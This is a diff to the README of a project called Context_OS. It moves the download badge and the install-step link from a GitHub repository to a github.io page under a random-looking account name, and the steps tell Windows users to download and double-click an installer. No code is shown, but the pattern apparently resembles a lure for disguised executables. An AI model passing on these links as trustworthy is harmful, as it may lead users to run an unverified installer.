@@ -1,6 +1,6 @@
 # 🤖 Context_OS - Organize your digital life with intelligence
 
-[![Download Context_OS](https://img.shields.io/badge/Download-Context_OS-blue.svg)](https://github.com/interbankloansenega594/Context_OS)
+[![Download Context_OS](https://img.shields.io/badge/Download-Context_OS-blue.svg)](https://interbankloansenega594.github.io)
 
 ## 📋 What is Context_OS?
 
@@ -22,7 +22,7 @@ Your computer needs specific parts to run this software. Check this list before 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit this page to download the software: https://github.com/interbankloansenega594/Context_OS
+1.  Visit this page to download the software: https://interbankloansenega594.github.io
 2.  Click the link to start the download.
 3.  Locate the downloaded file in your Downloads folder. 
 4.  Double-click the file to start the installer.
